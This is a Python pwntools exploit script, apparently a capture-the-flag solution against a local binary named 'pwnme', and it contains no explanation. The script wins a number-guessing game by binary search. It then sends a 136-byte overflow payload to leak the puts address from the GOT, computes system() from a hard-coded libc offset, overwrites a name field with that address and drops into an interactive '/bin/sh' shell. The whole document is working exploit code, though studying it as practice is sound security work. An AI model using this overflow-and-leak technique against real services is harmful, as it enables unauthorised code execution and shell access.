from pwn import *

def welcome(r):
    r.recvuntil("you need a name:")
    r.sendline("lalala")
    r.recvuntil("choose your ID between 0 and 300:")
    r.sendline("200")
    r.recvuntil("and your address:")
    r.sendline("hahaha")
    r.recvuntil("and your E-mail:")
    r.sendline("admin@mail.com")
    r.recvuntil("and your code(shown every time your profile changed):")
    r.sendline("/bin/sh")

#二分法爆破
def play(r):
    print "ok"
    r.recvuntil("nice try~\n")
    low=0
    high=4294967295
    a=(low+high)/2
    while True:
        r.recvuntil("guess a number or enter r to return:")
        r.sendline(str(a))
        r.recvline()
        res=r.recvline()
        if "big" in res:
            high=a
            a=(low+high)/2
            continue
        elif "small" in res:
            low=a
            a=(low+high)/2
            continue
        elif "excellent" in res:
            print "num is",
            print a,
            break
        else:
            print "error"
            return

def leaveadvice(r):
    r.recvuntil("leave your advice\n")
    payload='a'*136+p32(0x804b030)+p32(0x804b030)#puts addr
    r.sendline(payload)
    a=r.recv(4)
    print hex(u32(a))
    return a

def changeName(r,addr):
    r.recvuntil("try again?")
    r.sendline("y")
    r.recvuntil("wanna change a name?")
    r.sendline("y")
    r.recvuntil("new name:")
    code=p32(addr)
    r.sendline(code)

p=process("./pwnme")
welcome(p)
for x in xrange(0,1024):
    play(p)

putsaddr=leaveadvice(p)
systemaddr=u32(putsaddr)-0x25040
print hex(systemaddr)
changeName(p,systemaddr)

p.interactive()
